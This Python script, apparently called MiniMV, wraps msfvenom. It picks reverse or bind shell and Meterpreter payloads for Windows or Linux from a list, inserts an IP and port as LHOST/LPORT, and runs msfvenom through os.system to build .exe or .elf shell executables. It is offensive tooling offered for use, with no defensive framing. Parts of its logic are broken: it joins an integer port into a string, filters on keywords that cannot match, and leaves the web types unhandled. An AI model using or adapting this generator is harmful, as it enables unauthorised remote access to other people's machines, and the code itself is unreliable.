#!/usr/bin/env python3

import argparse
import socket
import sys
import os
import time

def parse_options():

    parser = argparse.ArgumentParser(description='python MiniMV.py -t win -met -a x64 -stageless -ip 127.0.0.1 -p 1234 ')
    parser.add_argument("-t", "--type", type=str, help="Type of Platform: Win, Lin , Web", dest='p_type')
    parser.add_argument("-m", "--met", help="Specify if Meterpreter shell", action ='store_true')
    parser.add_argument("-a", "--arch",  default="x86", type=str, help="Architecture (default x86) : x86, x64")
    parser.add_argument("-r", "--rev", help="Type of shell to generate (BIND/REV)", action='store_true')
    parser.add_argument("-s", "--stageless", help="Stageless : if specified -> stageless payload", action ='store_true')
    parser.add_argument("-ip", type=str, help="Local Host if Rev shell, Remote Host if Bind Shell")
    parser.add_argument("-p", "--port", type=int, help="Port to connect to")
    
    parser.add_argument("-li", "--listen", action="store_true", help='Open a socket and listen for a shell')
    parser.add_argument("-ls", "--list", action="store_true", help="List available shell types", dest='shell_list')
    
    args = parser.parse_args()
    if not args:
        print(parser.print_help())
    return args


def make_payload_list(txt):
    payload_list = {}
    print("[*] Generating payload list...")
    with open(txt,'r') as file:
    	lines = file.readlines()
    	for i, line in enumerate(lines):
    		payload_list[i] = line
    return payload_list		
	               
	            
def get_keywords() :
# extract keywords from command line for later search 
    switch_type = {
    'win' : 'windows',
    'lin' : 'linux',
    'web' : ['asp','php','tomcat','java'],
    'script' : ['py', 'ps1', 'pl' ]
    }
        
    key_type = switch_type.get(args.p_type.lower(),"There is an error in your shell OS type parameter")
    if isinstance (key_type, str):
        K_TYPE= key_type
    else:
        K_TYPE = input("[*] Enter your specific type of payload : ")
    
    #Get architecture 
    # warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
    if K_TYPE == "windows" and args.arch=="x86":
        K_ARCH=""
    else:
        K_ARCH = args.arch.lower()
    K_MET = "meterpreter" if args.met else ""
    K_BIND = "reverse" if args.rev else "bind"
    K_STAGE = "_" if args.stageless else ""
    return [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE]
    
def print_available_payloads(keywords,payload_list):
	avail_payloads = {}
	for i, p in payload_list.items():
	    match = []
	    temp_payloads ={}
	    for word in keywords.split():
	        if word in p:
	            match.append(True)
	            temp_payloads[i] = p
	            continue
	        else:
	            match.append(False)
	            break
	    if all(match):
	        avail_payloads |= temp_payloads
	#print("match is:", match)
	#print("available payloads", avail_payloads)
	
	if avail_payloads:
	    print("[+] {} Available payloads:".format(len(avail_payloads)))
	    print("-" * 40)
	    for i, p in avail_payloads.items():
	        print("{} : {}".format(i,p))
	    return avail_payloads
	    
	else:
            print("[!] Sorry, no payload found, please check your inputs")
            sys.exit(-1)

def generate_payload(params,number,avail_payloads,pname):
    K_TYPE ,K_ARCH,K_MET, K_BIND, K_STAGE, ipaddress,port = params
          
    if K_TYPE == "windows":
        payload="msfvenom -p {} LHOST={} LPORT={} -f exe -o {}".format(avail_payloads[number],ipaddress,port,pname+".exe")
        print("payload",payload)
    elif K_TYPE== "linux":
        payload="msfvenom -p {} LHOST={} LPORT={} -f elf -o {}".format(avail_payloads[number],args.ip,args.port,pname+".elf")

    	
    print("="*50)
    print("[*] Generating the Payload")
    print(payload)
    print("[*] please wait ...")    
    os.system(payload)
    return "[+] DONE ! Payload has been generated. "



def main(args):

    if args.ip and args.port :
        ipaddr = args.ip
        port = args.port
    else:
        ## getting the hostname by socket.gethostname() method
        hostname = socket.gethostname()
        ## getting the IP address using socket.gethostbyname() method
        ipaddr = socket.gethostbyname(hostname)
        port = int(input("[+] Enter port number for shell: "))
    
    payload_list = make_payload_list('venom-payloads.txt')
    params = get_keywords()
    params = params + [ipaddr,port]
    keywords_string= " ".join(params) # param = [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE,ipaddress,port]
    print(keywords_string) # for debug
    
    avail_payloads = print_available_payloads(keywords_string,payload_list)    
    
    i= int(input("[+] please enter your payload number: "))
    pname = keywords_string.replace(" ","-")
    print(pname)
    generate_payload(params,i,avail_payloads,pname)
        



if __name__ == "__main__":
       
    args = parse_options()
    main(args)    
